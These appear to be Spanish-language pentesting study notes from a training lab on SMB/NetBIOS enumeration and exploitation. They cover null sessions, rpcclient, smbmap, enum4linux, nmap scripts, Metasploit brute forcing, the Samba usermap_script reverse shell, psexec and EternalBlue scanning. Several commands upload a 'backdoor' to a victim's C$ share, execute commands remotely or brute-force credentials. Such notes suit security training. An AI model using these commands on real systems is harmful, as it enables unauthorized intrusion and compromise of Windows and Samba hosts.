Primero buscamos los puertos en el host de NetBios: 135,139, 445 usando nmap en el host.

[\\ComputerName\C$](file://ComputerName/C$)                //acceso de un admin al disco C, puede ser D$, E$

- [\\ComputerName\admin$](file://ComputerName/admin$)                //windows installation directory
- [\\ComputerName\ipc$](file://ComputerName/ipc$)                //Inter-process communication

### Nbtstat

>nbtstat /?                *vemos las opciones de nbstat*

>nbstat -A 192.169.100.1                *Muestra información sobre el host, type UNIQUE cuando el host solo tiene una IP asignada, <20> cuando hay un share folder en el host.*

### NET VIEW

>NET VIEW 192.169.100.1                //Muestra detalles sobre los shared folder

### rpcclient

>rpcclient -U “” -N 192.168.1.1        //conexión por rpc o smb

>rpcclient -U “” -N 192.168.1.1 → rcpclient>enumdomusers           //enum de usuarios

rpcclient>lookupnames admin        //muestra el SID del usuario admin

rpcclient>enumdomgroups                //muestra los grupos

### smbclient: 
Cliente similar a FTP para acceder a shared de Windows y poder enumerarlos. También muestra shares ocultos. : Tanto para Windows como Linux

>smbclient -L //192.168.100.1 -N        *-L busca los servicios disponibles, usar doble / para los host, -N fuerza a la herramienta no pedir passwords.*

>smbclient //192.168.100.1/IPC$ -N                *Prueba si nos podemos conectar al IPC$*

>smbclient //demo.ine/freddy        -N        *Acceso al folder de freddy probando sin credenciales*

>smbclient //192.168.1.1/admin -U admin        *Nos logueamos con admin*


| smb>cs hidden       | Nos movemos al folder       |
| ------------------- | --------------------------- |
| Smb>get flag.tar.gz | Descargamos el archivo flag |
| Smb>rm flag         | Removemos flag              |

### Smbmap: 
Tanto para Windows como Linux

>smbmap -H demo.ine.local        //-H para declarar un host. El comando permite visualizar los permisos de los shares a los que se tiene acceso sin password

>smbmap -H 192.168.1.1 -u Administrator -p 'password123' -r 'C$'     //lista los archivos de C$

>ssmbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor'

'C$\backdoor'  //cargamos un archivo desde el atacante a una ruta de la víctima

>smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download

'C$\flag.txt' //Descarga de un archivo

>smbmap -u guest -p "" -d . -H 10.0.28.123   //podemos probar con el user guest si pass.

> smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig' //-x para ejecutar

Metasploit

|   |   |
|---|---|
|msf>use auxiliary/scanner/smb/smb_version|Nos muestra la versión de Samba o SMB que está corriendo|
|msf>use auxiliary/scanner/smb/smb_enumshares|enumera shares|
|msf>use auxiliary/scanner/smb/smb_login|permite hacer ataque de fuerza bruta|
|msf(auxiliary/scanner/smb/smb_login)>set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt|passwords de la wordlist|
|msf(auxiliary/scanner/smb/smb_login)>set smbuser freddy|user que atacaremos|

Pipes: En Windows, son protocolos que permiten la comunicación entre procesos internos o con un host remoto

msf>use auxiliary/scanner/smb/pipe_auditor              //muestra los pipes que se puede acceder.

msf(scanner/smb/pipe_auditor)>set smbuser admin

msf(scanner/smb/pipe_auditor)>set smbpass pass123

msf(scanner/smb/pipe_auditor)>set rhosts 192.168.1.1

# Explotación SAMBA

|   |   |
|---|---|
|msf>use exploit/multi/samba/usermap_script|Username map script Command Execution. Ponemos el RHOST y vemos el reverse shell: cmd/unix/reverse_netcat. Nos da acceso a root directamente.|
|Shell>cat /etc/*issue|Pagina de inicio del servidor|
|Msf(exploit/multi/samba/usermap_script)>sessions -u 1|Upgrade a meterpreter|

Net use: Usar en Windows

>net use [\\192.168.100.1\IPC$](file://192.168.100.1/IPC$) ‘’ /u:’‘          //Para conectarnos a IPC$ usando un pass/user vacío

Si el comando funciona es porque el equipo es posiblemente vulnerable a Null Session y funciona solo con IPC$

Para Linux:

enum: 

Enumeración para comprobar si un sistema es vulnerable a Null Session. Para Windows. Para linux existe enum4linux con los mismos comandos.

>enum -n 192.168.100.1        //-n igual a nbtstat de windows

>enum -S -d 192.168.100.1        //-S Enumera shares administrativos también.-d, detailed info

>enum -U 192.168.100.1        //-U enumera los users del host

>enum -P 192.168.100.1        //-P revisa los password policy del host

>enum -s /usr/share/enum4linux/share-list.txt 192.168.100.1         //-s Ataque de fuerza bruta para detectar los shared en el host, complementario a -S

>enum -a 192.168.100.1        //-a muestra lo de todas las opciones previamente vistas.

>enum -i 192.168.100.1        //Información sobre las impresoras

RID cycling: RID es parte del SID que suma uno para cada nuevo usuario. RID empieza en 500 para usuarios del grupo admin, y 1001 para usuarios o grupos estándares.

>enum -r -u “admin” -p “password1” 192.168.1.1   /-r enumeración de SIDs por el RID

winfo: User en windows

>winfo 192.168.100.1        -n        //-n para user null sessions en el host

samrdump.py

Buscamos la ruta de la herramienta en la carpeta e  inpacket: /usr/share/doc/python-impacket-doc/examples para ejecutar con >python samrdump.py

>python samrdump.py 192.168.100.1   //si no tenemos user ni password, con null session. Da información sobre el host, las cuentas, password policy.

nmap

>nmap --script smb-os-discovery -p445 192.168.1.1 //Descubrimiento de OS que usa SMB

>nmap --script=smb-enum-users 192.168.100.1        //Para usuarios del host, ID y pass info

>nmap -script=smb-brute 192.168.100.1        //Fuerza bruta para las credenciales de acceso

>nmap -p445 --script smb-protocols 192.168.1.1        //        Detecta la versión del protocolo

>nmap -p445 --script smb-security-mode 192.168.1.1        //vuln scan e info de accounts

>nmap -p445 --script smb-enum-sessions 192.168.1.1        //sesiones de usuario activas

>nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=contrasenha 192.168.1.1 //Muestra las sesiones pero también logueandose por SMB al server especificado con credenciales. Misma estructura para smb-enum-users

>nmap -p445 --script smb-enum-shares 192.168.1.1        //enumera los shared en SMB

>nmap -p445 --script smb-enum-services 192.168.1.1        //servicios corriendo. Si nos logueamos con una cuenta admin, tendremos mucha más información

>nmap -p445 --script smb-enum-shares,smb-ls 192.168.1.1        //shares y “ls” command4

PsExec: Tool que permite ejecución de comandos a distancia. Vamos a explotarlo por SMB

Usamos metasploit con el módulo smb_login visto anteriormente para obtener credenciales

>psexec.py Administrator@192.168.1.1 cmd.exe        //user y el proceso que queremos usar

msf>use exploit/windows/smb/psexec        //usar psexec por metasploit

Eternalblue

>nmap -sV -p445 --script smb-vuln-ms17-010 192.168.1.1        //scan para ver la vulnerabilidad

PSEXEC.PY

|   |   |
|---|---|
|>chmod +x psexec.py|Damos permisos de ejecución|
|>python3 psexec.py Administrator@192.168.1.1|Nos conectamos al host por SMB|

## Linux

nmblookup: Lo mismo que Nbtstat. Herramienta de Samba suite

>nmblookup --help                //Muestra las opciones de la herramienta

>nmblookup -A 192.168.100.1        //Muestra los Workgroups y host que pertenecen

Se pueden usar los mismos comandos que enum de windows: enum4linux